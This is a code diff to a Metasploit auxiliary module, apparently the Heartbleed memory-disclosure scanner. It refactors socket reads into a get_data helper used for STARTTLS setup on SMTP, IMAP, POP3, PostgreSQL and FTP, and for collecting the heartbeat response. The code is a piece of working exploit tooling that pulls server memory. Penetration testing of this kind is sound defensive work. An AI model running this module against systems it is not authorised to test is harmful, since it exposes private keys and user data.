@@ -269,39 +269,39 @@ class Metasploit3 < Msf::Auxiliary
 
   def tls_smtp
     # https://tools.ietf.org/html/rfc3207
-    sock.get_once(-1, response_timeout)
+    get_data
     sock.put("EHLO #{Rex::Text.rand_text_alpha(10)}\r\n")
-    res = sock.get_once(-1, response_timeout)
+    res = get_data
 
     unless res && res =~ /STARTTLS/
       return nil
     end
     sock.put("STARTTLS\r\n")
-    sock.get_once(-1, response_timeout)
+    get_data
   end
 
   def tls_imap
     # http://tools.ietf.org/html/rfc2595
-    sock.get_once(-1, response_timeout)
+    get_data
     sock.put("a001 CAPABILITY\r\n")
-    res = sock.get_once(-1, response_timeout)
+    res = get_data
     unless res && res =~ /STARTTLS/i
       return nil
     end
     sock.put("a002 STARTTLS\r\n")
-    sock.get_once(-1, response_timeout)
+    get_data
   end
 
   def tls_postgres
     # postgresql TLS - works with all modern pgsql versions - 8.0 - 9.3
     # http://www.postgresql.org/docs/9.3/static/protocol-message-formats.html
-    sock.get_once
+    get_data
     # the postgres SSLRequest packet is a int32(8) followed by a int16(1234),
     # int16(5679) in network format
     psql_sslrequest = [8].pack('N')
     psql_sslrequest << [1234, 5679].pack('n*')
     sock.put(psql_sslrequest)
-    res = sock.get_once
+    res = get_data
     unless res && res =~ /S/
       return nil
     end
@@ -310,14 +310,14 @@ class Metasploit3 < Msf::Auxiliary
 
   def tls_pop3
     # http://tools.ietf.org/html/rfc2595
-    sock.get_once(-1, response_timeout)
+    get_data
     sock.put("CAPA\r\n")
-    res = sock.get_once(-1, response_timeout)
+    res = get_data
     if res.nil? || res =~ /^-/ || res !~ /STLS/
       return nil
     end
     sock.put("STLS\r\n")
-    res = sock.get_once(-1, response_timeout)
+    res = get_data
     if res.nil? || res =~ /^-/
       return nil
     end
@@ -361,7 +361,7 @@ class Metasploit3 < Msf::Auxiliary
     res = sock.get(response_timeout)
     return nil if res.nil?
     sock.put("AUTH TLS\r\n")
-    res = sock.get_once(-1, response_timeout)
+    res = get_data
     return nil if res.nil?
     if res !~ /^234/
       # res contains the error message
@@ -374,6 +374,24 @@ class Metasploit3 < Msf::Auxiliary
   #
   # Helper Methods
   #
+
+  # Get data from the socket
+  # this ensures the requested length is read (if available)
+  def get_data(length = -1)
+
+    return sock.get_once(-1, response_timeout) if length == -1
+
+    to_receive = length
+    data = ''
+    while to_receive > 0
+      temp = sock.get_once(to_receive, response_timeout)
+      break if temp.nil?
+
+      data << temp
+      to_receive -= temp.length
+    end
+    data
+  end
 
   # establishes a connect and parses the server response
   def establish_connect
@@ -420,7 +438,7 @@ class Metasploit3 < Msf::Auxiliary
     # This actually performs the heartbleed portion
     vprint_status("#{peer} - Sending Heartbeat...")
     sock.put(heartbeat_request(heartbeat_length))
-    hdr = sock.get_once(5, response_timeout)
+    hdr = get_data(5)
     if hdr.nil? || hdr.empty?
       vprint_error("#{peer} - No Heartbeat response...")
       return
@@ -433,7 +451,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # try to get the TLS error
     if type == ALERT_RECORD_TYPE
-      res = sock.get_once(len, response_timeout)
+      res = get_data(len)
       alert_unp = res.unpack('CC')
       alert_level = alert_unp[0]
       alert_desc = alert_unp[1]
@@ -458,16 +476,9 @@ class Metasploit3 < Msf::Auxiliary
     # In some cases the next header is parsed as data, because the returned
     # server reponse length is ignored, which may lead to unexpected behaviour.
     to_receive = heartbeat_length > SAFE_CHECK_MAX_RECORD_LENGTH ? heartbeat_length : len
-    heartbeat_data = ''
-    while to_receive > 0
-      temp = sock.get_once(to_receive, response_timeout)
-      break if temp.nil?
 
-      to_receive -= temp.length
-      heartbeat_data << temp
-    end
-    vprint_status("#{peer} - Heartbeat response - Got #{heartbeat_data.length} of #{len} bytes (requested #{heartbeat_length} bytes)")
-
+    heartbeat_data = get_data(to_receive)
+    vprint_status("#{peer} - Heartbeat response - Got #{heartbeat_data.length} of #{to_receive} bytes (requested #{heartbeat_length} bytes)")
     heartbeat_data
   end
 
